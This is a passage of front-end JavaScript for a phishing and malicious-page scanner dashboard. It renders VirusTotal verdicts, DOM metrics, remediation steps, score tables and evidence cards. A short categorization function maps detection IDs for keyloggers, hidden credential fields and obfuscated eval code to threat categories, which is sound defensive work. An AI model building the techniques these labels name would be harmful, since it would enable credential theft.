  // GSAP subtle entrance
  if (typeof gsap !== "undefined") {
    gsap.fromTo(
      resultDiv,
      { opacity: 0, y: 14 },
      { opacity: 1, y: 0, duration: 0.36, ease: "power2.out", clearProps: "transform,opacity" }
    );
    gsap.fromTo(
      "#result .verdict-hero, #result .risk-gauge-card, #result .vt-intel-card",
      { opacity: 0, y: 10 },
      { opacity: 1, y: 0, duration: 0.32, stagger: 0.05, delay: 0.06, ease: "power2.out", clearProps: "transform,opacity" }
    );
  }

  refreshIcons();

  if (lenisInstance) {
    lenisInstance.resize();
    lenisInstance.scrollTo(resultDiv, { offset: -86, duration: 0.8 });
  } else {
    resultDiv.scrollIntoView({ behavior: "smooth", block: "nearest" });
  }
}

// ================= VIRUSTOTAL THREAT INTELLIGENCE RENDERER =================
function renderVirusTotalIntelligence(vt) {
  const statusPill = document.getElementById("vtEngineStatusBadge");
  const statusNote = document.getElementById("vtStatusNote");
  const tsEl = document.getElementById("vtAnalysisTimestamp");
  const malEl = document.getElementById("vtMalicious");
  const suspEl = document.getElementById("vtSuspicious");
  const harmlessEl = document.getElementById("vtHarmless");
  const undetectedEl = document.getElementById("vtUndetected");
  const totalEl = document.getElementById("vtTotalEngines");
  const repEl = document.getElementById("vtReputation");
  const consensusWrap = document.getElementById("vtConsensusWrap");
  const consensusBar = document.getElementById("vtConsensusBar");
  const consensusSummary = document.getElementById("vtConsensusSummary");
  const disclaimerText = document.getElementById("vtDisclaimerText");

  const status = vt?.status || "unavailable";
  const isSuccess = vt?.available === true && status === "success";

  if (isSuccess) {
    const mal = typeof vt.malicious === "number" ? vt.malicious : 0;
    const susp = typeof vt.suspicious === "number" ? vt.suspicious : 0;
    const harmless = typeof vt.harmless === "number" ? vt.harmless : 0;
    const undetected = typeof vt.undetected === "number" ? vt.undetected : 0;
    const totalEngines = mal + susp + harmless + undetected;

    if (malEl) malEl.textContent = mal;
    if (suspEl) suspEl.textContent = susp;
    if (harmlessEl) harmlessEl.textContent = harmless;
    if (undetectedEl) undetectedEl.textContent = undetected;
    if (totalEl) totalEl.textContent = totalEngines;
    if (repEl) repEl.textContent = typeof vt.reputation === "number" ? vt.reputation : "N/A";
    if (tsEl) tsEl.textContent = vt.lastAnalysisDate || vt.analysisTimestamp || "N/A (Not supplied by feed)";

    if (statusPill) {
      if (mal > 0) {
        statusPill.className = "vt-status-pill flagged";
        statusPill.textContent = `${mal} MALICIOUS FLAG${mal === 1 ? "" : "S"}`;
      } else if (susp > 0) {
        statusPill.className = "vt-status-pill caution";
        statusPill.textContent = `${susp} SUSPICIOUS FLAG${susp === 1 ? "" : "S"}`;
      } else {
        statusPill.className = "vt-status-pill success";
        statusPill.textContent = "CLEAN CONSENSUS";
      }
    }

    if (statusNote) {
      statusNote.textContent = vt.message || `Reputation checked: ${mal} malicious, ${susp} suspicious, ${harmless} harmless out of ${totalEngines} engines.`;
      statusNote.style.color = mal > 0 ? "var(--color-malicious)" : susp > 0 ? "var(--color-suspicious)" : "var(--color-safe)";
    }

    if (consensusWrap && consensusBar && totalEngines > 0) {
      consensusWrap.style.display = "flex";
      consensusBar.innerHTML = "";
      const segs = [
        { cls: "vt-seg-malicious", count: mal, title: `Malicious: ${mal}` },
        { cls: "vt-seg-suspicious", count: susp, title: `Suspicious: ${susp}` },
        { cls: "vt-seg-harmless", count: harmless, title: `Harmless: ${harmless}` },
        { cls: "vt-seg-undetected", count: undetected, title: `Undetected: ${undetected}` }
      ];
      segs.forEach(seg => {
        if (seg.count > 0) {
          const div = document.createElement("div");
          div.className = seg.cls;
          div.style.width = `${((seg.count / totalEngines) * 100).toFixed(2)}%`;
          div.title = seg.title;
          consensusBar.appendChild(div);
        }
      });
      if (consensusSummary) {
        consensusSummary.textContent = `${mal} mal · ${susp} susp · ${harmless} harmless · ${undetected} undetected`;
      }
    } else if (consensusWrap) {
      consensusWrap.style.display = "none";
    }

    if (disclaimerText) {
      disclaimerText.textContent = mal === 0 && susp === 0
        ? "Zero VirusTotal detections indicates no vendor blacklist hits were recorded, but does not guarantee safety against newly deployed or unindexed threats."
        : "VirusTotal multi-vendor telemetry is weighed alongside static DOM inspection evidence.";
    }
  } else if (status === "not_found") {
    if (malEl) malEl.textContent = "0";
    if (suspEl) suspEl.textContent = "0";
    if (harmlessEl) harmlessEl.textContent = "N/A";
    if (undetectedEl) undetectedEl.textContent = "N/A";
    if (totalEl) totalEl.textContent = "0";
    if (repEl) repEl.textContent = "N/A";
    if (tsEl) tsEl.textContent = "Never Scanned";
    if (consensusWrap) consensusWrap.style.display = "none";
    if (statusPill) {
      statusPill.className = "vt-status-pill not_found";
      statusPill.textContent = "NOT INDEXED";
    }
    if (statusNote) {
      statusNote.textContent = vt?.message || "URL is not yet indexed in VirusTotal's global database (zero prior scans recorded).";
      statusNote.style.color = "var(--primary)";
    }
    if (disclaimerText) {
      disclaimerText.textContent = "Target URL has no prior analysis history in VirusTotal. Unindexed domains should not be assumed safe without manual verification.";
    }
  } else if (status === "not_applicable") {
    if (malEl) malEl.textContent = "N/A";
    if (suspEl) suspEl.textContent = "N/A";
    if (harmlessEl) harmlessEl.textContent = "N/A";
    if (undetectedEl) undetectedEl.textContent = "N/A";
    if (totalEl) totalEl.textContent = "N/A";
    if (repEl) repEl.textContent = "N/A";
    if (tsEl) tsEl.textContent = "N/A";
    if (consensusWrap) consensusWrap.style.display = "none";
    if (statusPill) {
      statusPill.className = "vt-status-pill not_applicable";
      statusPill.textContent = "NOT APPLICABLE";
    }
    if (statusNote) {
      statusNote.textContent = vt?.message || "VirusTotal reputation check not applicable for raw HTML input.";
      statusNote.style.color = "var(--text-muted)";
    }
    if (disclaimerText) {
      disclaimerText.textContent = "Raw HTML inspection evaluates submitted markup only. Submit a URL target to query global VirusTotal reputation feeds.";
    }
  } else {
    if (malEl) malEl.textContent = "Unavailable";
    if (suspEl) suspEl.textContent = "Unavailable";
    if (harmlessEl) harmlessEl.textContent = "Unavailable";
    if (undetectedEl) undetectedEl.textContent = "Unavailable";
    if (totalEl) totalEl.textContent = "N/A";
    if (repEl) repEl.textContent = "N/A";
    if (tsEl) tsEl.textContent = "Unavailable";
    if (consensusWrap) consensusWrap.style.display = "none";
    if (statusPill) {
      statusPill.className = "vt-status-pill unavailable";
      statusPill.textContent = "UNAVAILABLE";
    }
    if (statusNote) {
      statusNote.textContent = vt?.message || "Reputation check unavailable. No reputation conclusion can be drawn.";
      statusNote.style.color = "var(--text-secondary)";
    }
    if (disclaimerText) {
      disclaimerText.textContent = "VirusTotal intelligence is unavailable (missing API key, rate limit, or offline environment). Zero points added; verdict relies on static heuristics.";
    }
  }
}

// ================= STATIC DOM ANALYSIS MATRIX =================
function renderStaticDomMatrix(analysis) {
  const metrics = analysis?.metrics || {};

  const scriptsEl = document.getElementById("scripts");
  const extResEl = document.getElementById("domExternalResources");
  const formsEl = document.getElementById("domFormsCount");
  const hiddenEl = document.getElementById("hidden");
  const hiddenHintEl = document.getElementById("domHiddenCountHint");
  const iframesEl = document.getElementById("iframes");
  const iframeHintEl = document.getElementById("domIframeHint");
  const passEl = document.getElementById("domPasswordFields");
  const handlersEl = document.getElementById("domEventHandlers");
  const payloadEl = document.getElementById("domPayloadSize");
  const payloadBadge = document.getElementById("domPayloadSizeBadge");

  const totalScripts = typeof analysis?.totalScripts === "number" ? analysis.totalScripts : null;
  const totalIframes = typeof analysis?.totalIframes === "number" ? analysis.totalIframes : null;
  const hiddenDetected = typeof analysis?.hiddenElementsDetected === "boolean" ? analysis.hiddenElementsDetected : null;

  if (scriptsEl) scriptsEl.textContent = totalScripts !== null ? totalScripts : "N/A";
  if (extResEl) extResEl.textContent = typeof metrics.externalResourcesCount === "number" ? metrics.externalResourcesCount : "N/A";
  if (formsEl) formsEl.textContent = typeof metrics.formsCount === "number" ? metrics.formsCount : "N/A";

  if (hiddenEl) {
    if (hiddenDetected === null) {
      hiddenEl.textContent = "N/A";
      hiddenEl.style.color = "var(--text-muted)";
    } else {
      const totalHidden = typeof metrics.hiddenElementsCount === "number" ? metrics.hiddenElementsCount : null;
      const suspHidden = typeof metrics.suspiciousHiddenCount === "number" ? metrics.suspiciousHiddenCount : null;
      hiddenEl.textContent = hiddenDetected
        ? `Yes (${suspHidden ?? "Flagged"})`
        : (totalHidden !== null ? `${totalHidden} Benign` : "No");
      hiddenEl.style.color = hiddenDetected ? "var(--color-malicious)" : "var(--color-safe)";
      if (hiddenHintEl) {
        hiddenHintEl.textContent = hiddenDetected
          ? `${suspHidden ?? 1} suspicious concealed auth element(s)`
          : (totalHidden !== null ? `${totalHidden} standard UI hidden node(s), 0 threats` : "No concealed credential fields");
      }
    }
  }

  if (iframesEl) iframesEl.textContent = totalIframes !== null ? totalIframes : "N/A";
  if (iframeHintEl) {
    const suspIframes = typeof metrics.suspiciousIframesCount === "number" ? metrics.suspiciousIframesCount : null;
    iframeHintEl.textContent = suspIframes !== null && suspIframes > 0
      ? `${suspIframes} obscured/suspicious frame(s)`
      : "Evaluated for hidden/data src";
  }

  if (passEl) passEl.textContent = typeof metrics.passwordFieldsCount === "number" ? metrics.passwordFieldsCount : "N/A";
  if (handlersEl) handlersEl.textContent = typeof metrics.suspiciousEventHandlersCount === "number" ? metrics.suspiciousEventHandlersCount : "N/A";

  const payloadLen = typeof metrics.rawHtmlLength === "number" ? metrics.rawHtmlLength : null;
  const payloadLabel = payloadLen !== null ? `${payloadLen.toLocaleString()} chars` : "N/A";
  if (payloadEl) payloadEl.textContent = payloadLabel;
  if (payloadBadge) payloadBadge.textContent = `Payload: ${payloadLabel}`;

  // JS Patterns chip list
  const jsPatterns = Array.isArray(analysis?.suspiciousJSPatterns) ? analysis.suspiciousJSPatterns : [];
  const jsPatternsEl = document.getElementById("jsPatterns");
  if (jsPatternsEl) {
    jsPatternsEl.innerHTML = "";
    if (jsPatterns.length > 0) {
      jsPatterns.forEach(pattern => {
        const token = document.createElement("span");
        token.className = "code-token danger";
        token.textContent = String(pattern);
        jsPatternsEl.appendChild(token);
      });
    } else {
      jsPatternsEl.textContent = "None detected";
    }
  }

  // Matched Keywords chip list
  const matchedKeywords = Array.isArray(analysis?.matchedKeywords) ? analysis.matchedKeywords : [];
  const keywordsEl = document.getElementById("keywords");
  if (keywordsEl) {
    keywordsEl.innerHTML = "";
    if (matchedKeywords.length > 0) {
      matchedKeywords.forEach(kw => {
        const token = document.createElement("span");
        token.className = "keyword-token info-neutral";
        token.textContent = String(kw);
        keywordsEl.appendChild(token);
      });
    } else {
      keywordsEl.textContent = "None observed";
    }
  }
}

// ================= RENDER REMEDIATION PLAYBOOK =================
function renderRemediationPlaybook(data) {
  const banner = document.getElementById("remediationBanner");
  const summaryEl = document.getElementById("remediationSummary");
  const listEl = document.getElementById("remediationChecklist");
  const priorityTag = document.getElementById("remediationPriorityTag");

  if (!banner || !summaryEl || !listEl) return;

  const verdict = String(data.risk?.verdict || "SAFE").toUpperCase();
  const coverage = data.risk?.scanCoverage || "FULL";
  const findings = Array.isArray(data.risk?.evidenceFindings)
    ? data.risk.evidenceFindings
    : (Array.isArray(data.analysis?.findings) ? data.analysis.findings : []);
  const threatFindings = findings.filter(f => f.isThreat);

  banner.className = "remediation-callout " + verdict.toLowerCase();
  listEl.innerHTML = "";

  const steps = [];
  const pushStep = (msg) => {
    if (msg && !steps.includes(msg)) steps.push(msg);
  };

  if (verdict === "MALICIOUS") {
    if (priorityTag) priorityTag.textContent = "IMMEDIATE CONTAINMENT";
    summaryEl.textContent = "High-confidence threat indicators confirmed. Do not enter credentials and isolate target access immediately.";
    pushStep("Avoid entering credentials, API tokens, or payment details on this target.");
    threatFindings.forEach(f => pushStep(f.recommendedAction));
    if ((data.virusTotal?.malicious || 0) > 0) {
      pushStep("Block confirmed malicious destinations across corporate DNS filters, web proxies, and EDR policies.");
    }
  } else if (verdict === "SUSPICIOUS") {
    if (priorityTag) priorityTag.textContent = "ANALYST TRIAGE";
    summaryEl.textContent = "Anomalous DOM, script, or third-party indicators detected without confirmed widespread compromise. Verify before trusting.";
    threatFindings.forEach(f => pushStep(f.recommendedAction));
    if (coverage === "STATIC_ONLY" || data.virusTotal?.status === "not_found") {
      pushStep("Recheck suspicious targets with additional external threat intelligence and sandbox rendering before allowlisting.");
    }
  } else if (verdict === "INCONCLUSIVE") {
    if (priorityTag) priorityTag.textContent = "RE-INSPECTION ADVISED";
    summaryEl.textContent = "Target returned minimal or unparseable DOM content. Full static classification could not be established.";
    pushStep("Confirm target URL is reachable and serves valid HTML (WAF challenges or SPAs can return empty shells to non-browser clients).");
    pushStep("Capture the rendered DOM source from an isolated browser and resubmit via HTML Source Code mode.");
  } else {
    if (priorityTag) priorityTag.textContent = "ROUTINE MONITORING";
    summaryEl.textContent = "No verified threat signatures detected. Target conforms to standard static inspection baselines.";
    if (coverage === "STATIC_ONLY") {
      pushStep("Static inspection passed; reputation intelligence was unavailable — verify via additional threat intelligence if handling sensitive credentials.");
    } else {
      pushStep("Continue standard periodic monitoring; zero detections do not replace standard phishing hygiene and MFA enforcement.");
    }
  }

  steps.forEach((stepText, idx) => {
    const li = document.createElement("li");
    li.className = "remediation-step";
    const num = document.createElement("span");
    num.className = "remediation-step-num";
    num.textContent = `STEP ${idx + 1}`;
    const txt = document.createElement("span");
    txt.textContent = stepText;
    li.appendChild(num);
    li.appendChild(txt);
    listEl.appendChild(li);
  });
}

// ================= RENDER SCORE BREAKDOWN TABLE =================
function renderScoreBreakdown(scoredThreats, totalScore) {
  const tbody = document.getElementById("scoreBreakdownTableBody");
  const summaryEl = document.getElementById("scoreMathSummary");

  if (!tbody) return;
  tbody.innerHTML = "";

  if (summaryEl) {
    summaryEl.textContent = `Total Score: ${totalScore} / 100`;
  }

  if (!scoredThreats || scoredThreats.length === 0) {
    const tr = document.createElement("tr");
    tr.className = "score-row-clean";
    tr.innerHTML = `
      <td><span class="score-clean-id">CLEAN_BASELINE</span></td>
      <td>No threat indicators identified across static DOM and reputation inspection.</td>
      <td><span class="status-badge low">INFO</span></td>
      <td><span class="score-source-tag">BASELINE_AUDIT</span></td>
      <td>Standard authentic webpage structure</td>
      <td class="text-right"><strong class="points-clean">+0 pts</strong></td>
    `;
    tbody.appendChild(tr);
    return;
  }

  scoredThreats.forEach(item => {
    const tr = document.createElement("tr");
    const sev = String(item.severity || "MEDIUM").toUpperCase();
    const sevClass = sev === "CRITICAL" ? "high" : sev === "INFO" ? "low" : sev.toLowerCase();

    const tdId = document.createElement("td");
    const codeId = document.createElement("code");
    codeId.className = "score-threat-id";
    codeId.textContent = item.id || "THREAT_SIGNAL";
    tdId.appendChild(codeId);

    const tdName = document.createElement("td");
    tdName.textContent = item.name || "Security Threat Detection";

    const tdSev = document.createElement("td");
    const sevBadge = document.createElement("span");
    sevBadge.className = `status-badge ${sevClass}`;
    sevBadge.textContent = sev;
    tdSev.appendChild(sevBadge);

    const tdSrc = document.createElement("td");
    const srcTag = document.createElement("span");
    srcTag.className = "score-source-tag";
    srcTag.textContent = item.source || "ENGINE";
    tdSrc.appendChild(srcTag);

    const tdEv = document.createElement("td");
    const evCode = document.createElement("code");
    evCode.className = "score-threat-evidence";
    evCode.textContent = String(item.evidence || "").slice(0, 85);
    tdEv.appendChild(evCode);

    const tdPts = document.createElement("td");
    tdPts.className = "text-right";
    const strongPts = document.createElement("strong");
    strongPts.className = "points-threat";
    strongPts.textContent = `+${item.scoreContribution || 0} pts`;
    tdPts.appendChild(strongPts);

    tr.appendChild(tdId);
    tr.appendChild(tdName);
    tr.appendChild(tdSev);
    tr.appendChild(tdSrc);
    tr.appendChild(tdEv);
    tr.appendChild(tdPts);

    tbody.appendChild(tr);
  });
}

// ================= CATEGORIZE & RENDER DETECTION EVIDENCE =================
function categorizeEvidenceFinding(item) {
  const id = String(item?.id || "").toUpperCase();
  const name = String(item?.name || "").toUpperCase();

  if (id.includes("KEYLOGGER") || name.includes("KEYSTROKE")) {
    return "Keylogger indicators";
  }
  if (id.includes("EXTERNAL_CREDENTIAL_ACTION")) {
    return "Cross-domain form submissions";
  }
  if (
    id.includes("HIDDEN_CREDENTIAL") ||
    id.includes("HIDDEN_PASSWORD") ||
    id.includes("CREDENTIAL_SUBMISSION_RAW_IP") ||
    id.includes("INSECURE_PASSWORD") ||
    id.includes("SOCIAL_ENGINEERING")
  ) {
    return "Credential harvesting";
  }
  if (
    id.includes("EVAL_ENCODED") ||
    id.includes("FUNCTION_CONSTRUCTOR") ||
    id.includes("HEX_PACKED")
  ) {
    return "Obfuscated JavaScript";
  }
  if (
    id.includes("DYNAMIC_UNTRUSTED_SCRIPT") ||
    id.includes("IMMEDIATE_REDIRECT") ||
    id.includes("META_REFRESH") ||
    id.includes("INFO_SCRIPT")
  ) {
    return "Suspicious scripts";
  }
  if (id.includes("IFRAME")) {
    return "Suspicious iframes";
  }
  if (id.startsWith("VT_") || item?.source === "VIRUSTOTAL_REPUTATION") {
    return "VirusTotal intelligence";
  }
  return "Other detected anomalies";
}

function buildUnifiedEvidenceEntries(findings, scoredThreats) {
  const scoreMap = new Map();
  const sourceMap = new Map();
  (scoredThreats || []).forEach(st => {
    if (st && st.id) {
      scoreMap.set(st.id, st.scoreContribution || 0);
      if (st.source) sourceMap.set(st.id, st.source);
    }
  });

  const unified = [];
  const seenIds = new Set();

  (findings || []).forEach(f => {
    if (f?.id) seenIds.add(f.id);
    const pts = f?.isThreat && f?.id && scoreMap.has(f.id) ? scoreMap.get(f.id) : 0;
    const source = (f?.id && sourceMap.get(f.id)) || (String(f?.id || "").startsWith("VT_") ? "VIRUSTOTAL_REPUTATION" : "STATIC_HEURISTICS");
    unified.push({
      id: f?.id || "",
      name: f?.name || "Security Observation",
      category: categorizeEvidenceFinding(f),
      severity: String(f?.severity || "INFO").toUpperCase(),
      explanation: f?.explanation || f?.evidence || "",
      evidence: f?.evidence || "",
      whyItMatters: f?.whyItMatters || "",
      recommendedAction: f?.recommendedAction || "",
      isThreat: Boolean(f?.isThreat),
      source,
      scoreContribution: pts
    });
  });

  // Include VirusTotal or other scored threats not emitted inside static findings
  (scoredThreats || []).forEach(st => {
    if (!st || (st.id && seenIds.has(st.id))) return;
    unified.push({
      id: st.id || "",
      name: st.name || "Threat Signal",
      category: categorizeEvidenceFinding(st),
      severity: String(st.severity || "HIGH").toUpperCase(),
      explanation: st.evidence || st.name || "",
      evidence: st.evidence || "",
      whyItMatters: "Corroborated external reputation flag contributing to final risk classification.",
      recommendedAction: "Block or quarantine target destination and verify user exposure.",
      isThreat: true,
      source: st.source || "VIRUSTOTAL_REPUTATION",
      scoreContribution: st.scoreContribution || 0
    });
  });

  // Threats first, then informational observations
  unified.sort((a, b) => Number(b.isThreat) - Number(a.isThreat) || b.scoreContribution - a.scoreContribution);
  return unified;
}

function filterEvidenceCategory(category) {
  activeEvidenceCategory = category || "ALL";
  renderEvidenceCategoryTabs(cachedEvidenceEntries);
  renderFilteredEvidence();
  refreshIcons();
}

function renderEvidenceCategoryTabs(entries) {
  const tabsEl = document.getElementById("evidenceCategoryTabs");
  if (!tabsEl) return;
  tabsEl.innerHTML = "";

  if (!entries || entries.length === 0) return;

  const counts = new Map();
  entries.forEach(e => {
    counts.set(e.category, (counts.get(e.category) || 0) + 1);
  });

  const makeBtn = (label, key, count) => {
    const btn = document.createElement("button");
    btn.type = "button";
    btn.className = `evidence-cat-btn ${activeEvidenceCategory === key ? "active" : ""}`;
    btn.onclick = () => filterEvidenceCategory(key);

    const lblSpan = document.createElement("span");
    lblSpan.textContent = label;

    const cntSpan = document.createElement("span");
    cntSpan.className = "evidence-cat-count";
    cntSpan.textContent = count;

    btn.appendChild(lblSpan);
    btn.appendChild(cntSpan);
    tabsEl.appendChild(btn);
  };

  makeBtn("All Evidence", "ALL", entries.length);
  counts.forEach((count, category) => {
    makeBtn(category, category, count);
  });
}

function renderEvidenceFindings(findings, scoredThreats = []) {
  const threatBadge = document.getElementById("threatCountBadge");
  const infoBadge = document.getElementById("infoCountBadge");

  cachedEvidenceEntries = buildUnifiedEvidenceEntries(findings, scoredThreats);

  const threatCount = cachedEvidenceEntries.filter(f => f.isThreat).length;
  const infoCount = cachedEvidenceEntries.filter(f => !f.isThreat).length;

  if (threatBadge) threatBadge.textContent = `${threatCount} Threat${threatCount === 1 ? "" : "s"}`;
  if (infoBadge) infoBadge.textContent = `${infoCount} Informational`;

  renderEvidenceCategoryTabs(cachedEvidenceEntries);
  renderFilteredEvidence();
}

function renderFilteredEvidence() {
  const tbody = document.getElementById("evidenceTableBody");
  const container = document.getElementById("findingsContainer");
  if (!container) return;

  const visible = activeEvidenceCategory === "ALL"
    ? cachedEvidenceEntries
    : cachedEvidenceEntries.filter(e => e.category === activeEvidenceCategory);

  if (tbody) {
    tbody.innerHTML = "";
    if (visible.length === 0) {
      const tr = document.createElement("tr");
      const td = document.createElement("td");
      td.colSpan = 6;
      td.className = "table-date-cell";
      td.textContent = "No analyzer findings or threat anomalies recorded.";
      tr.appendChild(td);
      tbody.appendChild(tr);
    } else {
      visible.forEach(item => {
        const tr = document.createElement("tr");
        const sevClass = item.severity === "CRITICAL" ? "high" : item.severity === "INFO" ? "low" : item.severity.toLowerCase();

        const tdName = document.createElement("td");
        tdName.textContent = item.name;

        const tdCat = document.createElement("td");
        const catPill = document.createElement("span");
        catPill.className = "evidence-cat-pill";
        catPill.textContent = item.category;
        tdCat.appendChild(catPill);

        const tdDesc = document.createElement("td");
        tdDesc.className = "evidence-desc-cell";
        tdDesc.textContent = item.explanation || item.evidence || "--";

        const tdSev = document.createElement("td");
        const sevBadge = document.createElement("span");
        sevBadge.className = `status-badge ${sevClass}`;
        sevBadge.textContent = item.severity;
        tdSev.appendChild(sevBadge);

        const tdSrc = document.createElement("td");
        const srcTag = document.createElement("span");
        srcTag.className = "score-source-tag";
        srcTag.textContent = item.source;
        tdSrc.appendChild(srcTag);

        const tdPts = document.createElement("td");
        tdPts.className = "text-right";
        const ptsEl = document.createElement("strong");
        ptsEl.className = item.scoreContribution > 0 ? "points-threat" : "points-clean";
        ptsEl.textContent = `+${item.scoreContribution} pts`;
        tdPts.appendChild(ptsEl);

        tr.appendChild(tdName);
        tr.appendChild(tdCat);
        tr.appendChild(tdDesc);
        tr.appendChild(tdSev);
        tr.appendChild(tdSrc);
        tr.appendChild(tdPts);
        tbody.appendChild(tr);
      });
    }
  }

  container.innerHTML = "";
  if (visible.length === 0) {
    container.innerHTML = `
      <div class="findings-empty-note">
        <i data-lucide="shield-check" class="icon-18"></i>
        <span>Clean security baseline: No threat findings or anomalous signatures recorded.</span>
      </div>
    `;
    return;
  }

  visible.forEach(f => {
    const card = document.createElement("div");
    card.className = `evidence-card ${f.isThreat ? "is-threat" : "is-info"} sev-${f.severity.toLowerCase()}`;

    const header = document.createElement("div");
    header.className = "evidence-card-header";

    const titleGroup = document.createElement("div");
    titleGroup.className = "evidence-title-group";

    const title = document.createElement("h5");
    title.className = "evidence-name";
    title.textContent = f.name;

    const catBadge = document.createElement("span");
    catBadge.className = "evidence-cat-pill";
    catBadge.textContent = f.category;

    const typeChip = document.createElement("span");
    typeChip.className = `evidence-type-chip ${f.isThreat ? "threat" : "info"}`;
    typeChip.textContent = f.isThreat ? "Threat Indicator" : "Informational";

    titleGroup.appendChild(title);
    titleGroup.appendChild(catBadge);
    titleGroup.appendChild(typeChip);

    const headerBadges = document.createElement("div");
    headerBadges.className = "evidence-header-badges";

    const scoreBadge = document.createElement("span");
    scoreBadge.className = `evidence-score-badge ${f.scoreContribution > 0 ? "scored" : "zero"}`;
    scoreBadge.textContent = `+${f.scoreContribution} pts`;

    const sevBadge = document.createElement("span");
    sevBadge.className = `evidence-sev-badge sev-${f.severity.toLowerCase()}`;
    sevBadge.textContent = f.severity;

    headerBadges.appendChild(scoreBadge);
    headerBadges.appendChild(sevBadge);

    header.appendChild(titleGroup);
    header.appendChild(headerBadges);
    card.appendChild(header);

    const body = document.createElement("div");
    body.className = "evidence-card-body";

    if (f.explanation) body.appendChild(createEvidenceRow("Description:", f.explanation, "text"));
    if (f.evidence) body.appendChild(createEvidenceRow("Observed Evidence:", f.evidence, "code"));
    if (f.whyItMatters) body.appendChild(createEvidenceRow("Why It Matters:", f.whyItMatters, "text"));
    if (f.recommendedAction) body.appendChild(createEvidenceRow("Recommended Action:", f.recommendedAction, "action"));

    card.appendChild(body);
    container.appendChild(card);
  });
}

function createEvidenceRow(label, content, type) {
  const row = document.createElement("div");
  row.className = "evidence-row";

  const lbl = document.createElement("span");
  lbl.className = "evidence-row-label";
  lbl.textContent = label;

  let val;
  if (type === "code") {
    val = document.createElement("div");
    val.className = "evidence-code-wrap";

    const codeEl = document.createElement("code");
    codeEl.className = "evidence-row-code";
    codeEl.textContent = content;

    const copyBtn = document.createElement("button");
    copyBtn.type = "button";
    copyBtn.className = "copy-evidence-btn";
    copyBtn.innerHTML = `<i data-lucide="copy" class="icon-12"></i><span>Copy</span>`;
    copyBtn.onclick = () => {
      if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(String(content)).then(() => {
          copyBtn.innerHTML = `<i data-lucide="check" class="icon-12"></i><span>Copied</span>`;
          refreshIcons();
          setTimeout(() => {
            copyBtn.innerHTML = `<i data-lucide="copy" class="icon-12"></i><span>Copy</span>`;
            refreshIcons();
          }, 1600);
        });
      }
    };

    val.appendChild(codeEl);
    val.appendChild(copyBtn);
  } else if (type === "action") {
    val = document.createElement("span");
    val.className = "evidence-row-action";
    val.textContent = content;
  } else {
    val = document.createElement("span");
    val.className = "evidence-row-text";
    val.textContent = content;
  }

  row.appendChild(lbl);
  row.appendChild(val);
  return row;
}

function highlightSeverityViolations(data) {
  const rowScripts = document.getElementById("param-scripts");
  const rowHidden = document.getElementById("param-hidden");
  const rowIframes = document.getElementById("param-iframes");
  const rowKeywords = document.getElementById("param-keywords");
  const rowVt = document.getElementById("param-vt");

  if (rowScripts) {
    rowScripts.classList.toggle("param-violation", (data.analysis?.suspiciousJSPatterns?.length || 0) > 0);
  }
  if (rowHidden) {
    rowHidden.classList.toggle("param-violation", !!data.analysis?.hiddenElementsDetected);
  }
  if (rowIframes) {
    rowIframes.classList.toggle("param-violation", (data.analysis?.metrics?.suspiciousIframesCount || 0) > 0);
  }
  if (rowKeywords) {
    rowKeywords.classList.toggle("param-violation", (data.analysis?.metrics?.phishingThreatsCount || 0) > 0);
  }
  if (rowVt) {
    rowVt.classList.toggle("param-violation", (data.virusTotal?.malicious || 0) > 0);
  }
}

// ================= CLEAR FORM =================
function clearForm() {
  const inputEl = document.getElementById("inputData");
  const resultDiv = document.getElementById("result");
  const downloadBtn = document.getElementById("downloadBtn");

  if (inputEl) inputEl.value = "";
  if (resultDiv) resultDiv.style.display = "none";
  if (downloadBtn) downloadBtn.style.display = "none";
  stopScanAnimation();

  ["param-scripts", "param-hidden", "param-iframes", "param-keywords", "param-vt"].forEach(id => {
    const el = document.getElementById(id);
    if (el) el.classList.remove("param-violation");
  });

  if (lenisInstance) lenisInstance.resize();
}

// ================= SESSION HISTORY STORAGE =================
function saveToHistory(target, severity, fullData = null, rawInput = "", timestamp = "") {
  const history = JSON.parse(sessionStorage.getItem("scanHistory")) || [];

  const verdict = fullData?.risk?.verdict || severity;
  const safeRawInput = (typeof rawInput === "string" && rawInput.length <= 32768) ? rawInput : "";

  const record = {
    target: target,
    severity: severity,
    verdict: verdict,
    time: timestamp || new Date().toLocaleString(),
    rawInput: safeRawInput,
    fullData: fullData ? {
      risk: fullData.risk,
      analysis: fullData.analysis,
      virusTotal: fullData.virusTotal
    } : null
  };

  history.unshift(record);
  const trimmed = history.slice(0, 20);
  try {
    sessionStorage.setItem("scanHistory", JSON.stringify(trimmed));
  } catch (_) {
    // Graceful fallback if rawInput pushes sessionStorage close to quota
    record.rawInput = "";
    sessionStorage.setItem("scanHistory", JSON.stringify(trimmed.slice(0, 10)));
  }
}

async function clearScanHistory() {
  const confirmed = await showSocConfirm({
    title: "Clear Audit Log?",
    text: "This will permanently clear all recorded scan results from your current browser session.",
    confirmText: "Clear History"
  });

  if (confirmed) {
    sessionStorage.removeItem("scanHistory");
    refreshAllDashboardData();
    showSocAlert({
      icon: "success",
      title: "Audit Log Cleared",
      text: "Session scan history has been reset."
    });
  }
}

// ================= DASHBOARD & HISTORY REFRESH =================
function refreshAllDashboardData() {
  const history = JSON.parse(sessionStorage.getItem("scanHistory")) || [];

  const historyBadge = document.getElementById("historyBadgeCount");
  if (historyBadge) historyBadge.innerText = history.length;

  const total = history.length;
  const safeCount = history.filter(h => {
    const v = (h.verdict || h.severity || "").toUpperCase();
    return v === "SAFE" || v === "LOW";
  }).length;

  const suspiciousCount = history.filter(h => {
    const v = (h.verdict || h.severity || "").toUpperCase();
    return v === "SUSPICIOUS" || v === "MEDIUM";
  }).length;

  const maliciousCount = history.filter(h => {
    const v = (h.verdict || h.severity || "").toUpperCase();
    return v === "MALICIOUS" || v === "HIGH";
  }).length;

  const statTotal = document.getElementById("statTotalScans");
  const statSafe = document.getElementById("statSafeScans");
  const statSuspicious = document.getElementById("statSuspiciousScans");
  const statMalicious = document.getElementById("statMaliciousScans");

  if (statTotal) statTotal.innerText = total;
  if (statSafe) statSafe.innerText = safeCount;
  if (statSuspicious) statSuspicious.innerText = suspiciousCount;
  if (statMalicious) statMalicious.innerText = maliciousCount;

  // Real percentage shares
  const safeShare = document.getElementById("statSafeShare");
  const suspShare = document.getElementById("statSuspiciousShare");
  const malShare = document.getElementById("statMaliciousShare");
  if (safeShare) safeShare.innerText = total > 0 ? `${Math.round((safeCount / total) * 100)}%` : "0%";
  if (suspShare) suspShare.innerText = total > 0 ? `${Math.round((suspiciousCount / total) * 100)}%` : "0%";
